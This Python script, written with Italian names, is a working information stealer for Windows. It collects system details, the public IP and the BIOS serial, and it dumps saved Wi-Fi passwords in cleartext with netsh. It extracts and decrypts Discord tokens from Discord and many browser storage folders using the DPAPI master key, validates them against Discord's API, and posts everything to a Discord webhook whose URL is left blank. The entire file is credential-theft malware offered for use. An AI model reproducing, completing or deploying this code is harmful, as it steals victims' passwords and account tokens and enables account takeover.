import base64
import os
import platform
import re
import shutil
import json
import requests
import subprocess
from datetime import datetime
from Crypto.Cipher import AES
import win32crypt

def grab_windows():
    def ottieni_gpu():
        try:
            import wmi
            c = wmi.WMI()
            gpus = c.Win32_VideoController()
            gpu_info = ', '.join([gpu.Name for gpu in gpus])
            return gpu_info
        except ImportError:
            return "wmi module non installato"
        except Exception as e:
            return f"Errore GPU: {e}"

    def ottieni_spazio(unità):
        try:
            total, used, free = shutil.disk_usage(unità)
            return f"Totale: {total // (2**30)} GB, Usato: {used // (2**30)} GB, Libero: {free // (2**30)} GB"
        except Exception as e:
            return f"Errore spazio disco: {e}"
    try:
            seriale = subprocess.check_output(
            [
                "powershell",
                "-NoProfile",
                "-NonInteractive",
                "-Command",
                "(Get-CimInstance Win32_BIOS).SerialNumber"
            ],
            text=True
        ).strip()
    except:
            seriale = "Non disponibile"

    informazioni_sistema = [
        ("Sistema Operativo", platform.system()),
        ("Versione", platform.version()),
        ("Architettura", platform.machine()),
        ("Nome Host", platform.node()),
        ("Processore", platform.processor()),
        ("Rilascio", platform.release()),
        ("GPU", ottieni_gpu()),
        ("Spazio Disco C:", ottieni_spazio("C:\\")),
        ("Numero Seriale BIOS", seriale)
    ]
    
    return informazioni_sistema

def informazioni_rete():
    def ottieni_macaddress():
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                           for elements in range(0, 2*6, 2)][::-1])
            return mac
        except:
            return "Non disponibile"

    def ottieni_ipv4():
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            try:
                response = requests.get('https://ident.me', timeout=5)
                return response.text
            except:
                return "Non disponibile"
        
    def ottieni_passwordwifi():
        try:
            profiles = subprocess.check_output(
                'netsh wlan show profiles', 
                shell=True, 
                stderr=subprocess.DEVNULL, 
                stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW
            ).decode('utf-8', errors='ignore').split('\n')

            wifi_list = [
                profile.split(':')[1].strip() 
                for profile in profiles 
                if 'Tutti i profili utente' in profile
            ]

            passwords = {}
            for wifi_name in wifi_list:
                try:
                    wifi_info = subprocess.check_output(
                        f'netsh wlan show profile "{wifi_name}" key=clear',
                        shell=True,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    ).decode('utf-8', errors='ignore')

                    for line in wifi_info.split('\n'):
                        if 'Contenuto chiave' in line:
                            passwords[wifi_name] = line.split(':')[1].strip()
                            break
                except:
                    continue

            return passwords
        except:
            return {}
    
    
    informazioni_rete_lista = [
        ("IP Pubblico", ottieni_ipv4()),
        ("MAC Address", ottieni_macaddress()),
    ]
    
    
    wifi_passwords = ottieni_passwordwifi()
    if wifi_passwords:
        password_text = "\n".join([f"{nome}: {pwd}" for nome, pwd in wifi_passwords.items()])
        informazioni_rete_lista.append(("Password WiFi Salvate", password_text))
    
    return informazioni_rete_lista

class EstraiToken:
    def __init__(self):
        self.base_url = 'https://discord.com/api/v9/users/@me'
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.regexp = r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}'
        self.regexp_enc = r'dQw4w9WgXcQ:[^\\\"]*'
        self.tokens = []
        self.uids = []
        self.estrai()

    def estrai(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Google Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome (Profile 1)': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome (Profile 2)': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome (Profile 3)': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome (Profile 4)': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome (Profile 5)': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Chromium': self.appdata + '\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Microsoft Edge Beta': self.appdata + '\\Microsoft\\Edge Beta\\User Data\\Default\\Local Storage\\leveldb\\',
            'Microsoft Edge Dev': self.appdata + '\\Microsoft\\Edge Dev\\User Data\\Default\\Local Storage\\leveldb\\',
            'Internet Explorer': self.appdata + '\\Microsoft\\Internet Explorer\\User Data\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Opera Neon': self.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\Local Storage\\leveldb\\',
            'AVG Secure Browser': self.appdata + '\\AVG\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Slimjet': self.appdata + '\\Slimjet\\User Data\\Default\\Local Storage\\leveldb\\',
            '360 Browser': self.appdata + '\\360Browser\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Maxthon': self.appdata + '\\Maxthon\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc': self.appdata + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Comodo Dragon': self.appdata + '\\Comodo\\Dragon\\User Data\\Default\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Default\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Default\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Default\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Default\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Default\\Local Storage\\leveldb\\',
            'Elements Browser': self.appdata + '\\Elements Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Mozilla Firefox': self.roaming + '\\Mozilla\\Firefox\\Profiles\\',
            'Waterfox': self.roaming + '\\Waterfox\\Profiles\\',
            'Pale Moon': self.roaming + '\\Moonchild Productions\\Pale Moon\\Profiles\\',
            'SeaMonkey': self.roaming + '\\Mozilla\\SeaMonkey\\Profiles\\',
            'Safari': self.appdata + '\\Apple Computer\\Safari\\Local Storage\\'
        }
        
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
                
            _discord = name.replace(' ', '').lower()
            if 'discord' not in _discord:
                _discord = 'discord'
                
            for file_name in os.listdir(path):
                if not file_name.endswith(('.log', '.ldb')):
                    continue
                    
                try:
                    with open(f'{path}\\{file_name}', 'r', errors='ignore') as f:
                        for line in f:
                            line = line.strip()
                            if not line:
                                continue
                                
                            for y in re.findall(self.regexp_enc, line):
                                try:
                                    master_key = self.get_master_key(self.roaming + f'\\{_discord}\\Local State')
                                    if not master_key:
                                        continue
                                        
                                    token = self.decrittografia(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), master_key)
                                    if token and self.valida_token(token):
                                        uid = requests.get(self.base_url, headers={'Authorization': token}).json().get('id')
                                        if uid and uid not in self.uids:
                                            self.tokens.append(token)
                                            self.uids.append(uid)
                                except:
                                    continue
                                    
                            for token in re.findall(self.regexp, line):
                                if self.valida_token(token):
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json().get('id')
                                    if uid and uid not in self.uids:
                                        self.tokens.append(token)
                                        self.uids.append(uid)
                except:
                    continue

    def valida_token(self, token):
        if not token:
            return False
        try:
            response = requests.get(self.base_url, headers={'Authorization': token})
            return response.status_code == 200
        except:
            return False

    def decrittografia(self, buff, master_key):
        if not buff or not master_key:
            return None
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            decrypted = decrypted[:-16].decode()  
            return decrypted
        except:
            return None

    def get_master_key(self, path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
                master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = master_key[5:] 
                return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        except:
            return None


def invia_webhook():
    info_sistema = grab_windows()
    info_rete = informazioni_rete()
    estrattore = EstraiToken()
    
    webhook_url = ""
    
    embed_sistema = {
        "title": "Informazioni Sistema",
        "description": "",
        "color": 3447003,
        "timestamp": datetime.utcnow().isoformat(),
        "fields": []
    }
    
    for nome, valore in info_sistema:
        embed_sistema["fields"].append({
            "name": nome,
            "value": f"```{valore}```",
            "inline": False
        })
    
    embed_rete = {
        "title": "Informazioni Rete",
        "description": "",
        "color": 15105570,
        "fields": []
    }
    
    for nome, valore in info_rete:
        embed_rete["fields"].append({
            "name": nome,
            "value": f"```{valore}```",
            "inline": False
        })
    
    embed_token = {
        "title": "Token Discord",
        "description": "",
        "color": 10181046,
        "fields": []
    }
    
  
    if hasattr(estrattore, 'tokens') and estrattore.tokens:
        if isinstance(estrattore.tokens, dict):
            
            for nome, valore in estrattore.tokens.items():
                embed_token["fields"].append({
                    "name": nome,
                    "value": f"```{valore}```",
                    "inline": False
                })
        elif isinstance(estrattore.tokens, list):
   
            if len(estrattore.tokens) > 0 and isinstance(estrattore.tokens[0], tuple):
              
                for nome, valore in estrattore.tokens:
                    embed_token["fields"].append({
                        "name": nome,
                        "value": f"```{valore}```",
                        "inline": False
                    })
            else:
                
                for i, token in enumerate(estrattore.tokens, 1):
                    embed_token["fields"].append({
                        "name": f"Token {i}",
                        "value": f"```{token}```",
                        "inline": False
                    })
    else:
        embed_token["fields"].append({
            "name": "Nessun token trovato",
            "value": "```Nessun token Discord trovato sul sistema```",
            "inline": False
        })
    
    payload = {
        "embeds": [embed_sistema, embed_rete, embed_token],
        "username": "Mattone",
    }
    
    try:
        headers = {'Content-Type': 'application/json'}
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        
        if response.status_code == 204:
            pass
        else:
            pass
    except Exception as e:
        pass


if __name__ == "__main__":
    invia_webhook()